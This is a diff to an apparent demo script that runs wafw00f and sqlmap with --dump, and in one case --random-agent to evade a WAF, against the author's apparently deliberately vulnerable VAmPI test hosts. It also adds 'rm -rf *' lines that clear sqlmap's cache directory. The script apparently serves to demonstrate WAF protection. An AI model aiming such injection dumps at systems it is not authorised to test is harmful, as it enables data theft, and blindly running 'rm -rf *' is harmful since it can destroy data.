@@ -1,18 +1,26 @@
+## Move to location of caching info
+cd /home/kvaes/.local/share/sqlmap/output
 
 ## Prove there is no WAF
 wafw00f kvaesvampisecure.azurewebsites.net
 ## Scan the secure version, no dump
 sqlmap -u "https://kvaesvampisecure.azurewebsites.net/users/v1/*admin*" --method=GET --dump
+## remove caching info
+rm -rf *
 
 ## Prove there is no WAF
 wafw00f kvaesvampiinsecure.azurewebsites.net
 ## Scan the insecure version, results in a dump
 sqlmap -u "https://kvaesvampiinsecure.azurewebsites.net/users/v1/*admin*" --method=GET --dump
+## remove caching info
+rm -rf *
 
 ## Show that AZ FD WAF is detected
 wafw00f kvaestestvampi-g3dsbehwaghrgadx.b01.azurefd.net
 ## Scan the insecure version, results in a dump
 sqlmap -u "https://kvaestestvampi-g3dsbehwaghrgadx.b01.azurefd.net/insecure/users/v1/*admin*" --method=GET --dump
+## remove caching info
+rm -rf *
 
 ## Show CloudFlare is detected
 wafw00f vampiinsecure.kvaes.be
@@ -20,3 +28,5 @@ wafw00f vampiinsecure.kvaes.be
 sqlmap -u "https://vampiinsecure.kvaes.be/users/v1/*admin*" --method=GET --dump
 ## Try again with random agents, results in a dump
 sqlmap -u "https://vampiinsecure.kvaes.be/users/v1/*admin*" --method=GET --dump --random-agent
+## remove caching info
+rm -rf *
